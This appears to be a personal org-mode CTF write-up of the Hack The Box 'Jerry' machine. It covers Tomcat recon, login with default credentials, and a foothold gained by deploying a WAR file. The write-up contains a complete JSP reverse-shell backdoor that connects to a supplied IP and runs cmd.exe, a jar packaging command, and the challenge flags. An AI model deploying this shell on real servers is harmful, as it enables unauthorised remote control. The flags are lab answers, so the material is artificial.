@@ -1,0 +1,126 @@
+:PROPERTIES:
+:ID:       6aa954f2-4114-4608-b6f5-bc21ec49180a
+:END:
+#+title: Jerry
+#+filetags: :webexp:ctf:hackthebox:writeup:
+
+* Description
+No description is provided.
+
+* Recon
+We start with ~nmap~, only port 8080 is open with "Apache Tomcat/Coyote JSP engine 1.1" behind it.
+
+Clicking around the site, we notice that we can login into the "Server Status" page by providing the credentials admin:admin. For any other page we get "403".
+
+If we go to the "Manager App" page, we get a "403" using the same credentials as above, however, the default credentials are written on that page as follows:
+#+begin_example
+For example, to add the `manager-gui` role to a user named `tomcat` with a password of `s3cret`, add the following to the config (conf/tomcat-users.xml) file listed above.
+#+end_example
+An attack surface might come be available due to a misconfiguration, in this case, using the default username and password.
+
+/Note: To login again, clear the history from the browser./
+
+* Foothold
+Logging with the default username and password, we can view the manager control page. The interesting part is to us is the ability to deploy WAR files, which we can execute when we visit said page and by extension, getting RCE.
+
+We first need to get a reverse shell script in ~jsp~. After some googling, we land on the following code:
+#+begin_src java
+<%@page import="java.lang.*"%>
+<%@page import="java.io.*"%>
+<%@page import="java.net.*"%>
+<%@page import="java.util.*"%>
+
+<%!
+static class StreamConnector extends Thread
+{
+        InputStream is;
+        OutputStream os;
+        StreamConnector(InputStream is, OutputStream os)
+        {
+                this.is = is;
+                this.os = os;
+        }
+        public void run()
+        {
+                BufferedReader isr = null;
+                BufferedWriter osw = null;
+                try
+                {
+                        isr = new BufferedReader(new InputStreamReader(is));
+                        osw = new BufferedWriter(new OutputStreamWriter(os));
+                        char buffer[] = new char[8192];
+                        int lenRead;
+                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)
+                        {
+                                osw.write(buffer, 0, lenRead);
+                                osw.flush();
+                        }
+                }
+                catch (Exception ioe) {System.out.println("FAILD")}
+                try
+                {
+                        if(isr != null) isr.close();
+                        if(osw != null) osw.close();
+                }
+                catch (Exception ioe) {System.out.println("FAILD")}
+        }
+}
+%>
+
+<h1>JSP Backdoor Reverse Shell</h1>
+
+<form method="post">
+IP Address
+<input type="text" name="ipaddress" size=30>
+Port
+<input type="text" name="port" size=10>
+<input type="submit" name="Connect" value="Connect">
+</form>
+<p>
+<hr>
+
+<%
+String ipAddress = request.getParameter("ipaddress");
+String ipPort = request.getParameter("port");
+if(ipAddress != null && ipPort != null)
+{
+        Socket sock = null;
+        try
+        {
+                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());
+                Runtime rt = Runtime.getRuntime();
+                Process proc = rt.exec("cmd.exe");
+                StreamConnector outputConnector =
+                        new StreamConnector(proc.getInputStream(),
+                                          sock.getOutputStream());
+                StreamConnector inputConnector =
+                        new StreamConnector(sock.getInputStream(),
+                                          proc.getOutputStream());
+                outputConnector.start();
+                inputConnector.start();
+        }
+        catch (Exception ioe) {System.out.println("FAILD")}
+}
+%>
+#+end_src
+The above code needed a few tweaks, namely improving the imports and adding a print statement inside the catch block. To compile into a ~war~ file, we use ~jar -cvf rev.war rev.jsp~ where ~rev.jsp~ is the file above.
+
+Navigating to ~<IP-ADDRESS>:8080/rev/rev.jsp~, we get a post form where we can insert the local ip and port where ~nc~ is listening.
+
+To get the flags, we navigate to the file ~2 for the price of 1.txt~ which is located under the ~Administrator~ desktop directory.
+
+* Flag
+** root
+#+begin_example
+HTB{04a8b36e1545a455393d067e772fe90e}
+#+end_example
+** user
+#+begin_example
+HTB{7004dbcef0f854e0fb401875f26ebd00}
+#+end_example
+* Notes
+- The password I tried was the default one for tomcat, which was specified in the documentation. If that password didn't work, we can use [[id:5bd21646-07ae-4dfe-89d4-9bb67158ef4e][Hydra]] to brute force a possible password.
+- This can also be done using [[id:4b5fff4e-378c-4a29-93da-c852c5cf79d3][Metasploit]], just like IppSec demonstrated in his video.
+
+* Resources
+- IppSec's [[https://www.youtube.com/watch?v=PJeBIey8gc4][video]] about Jerry
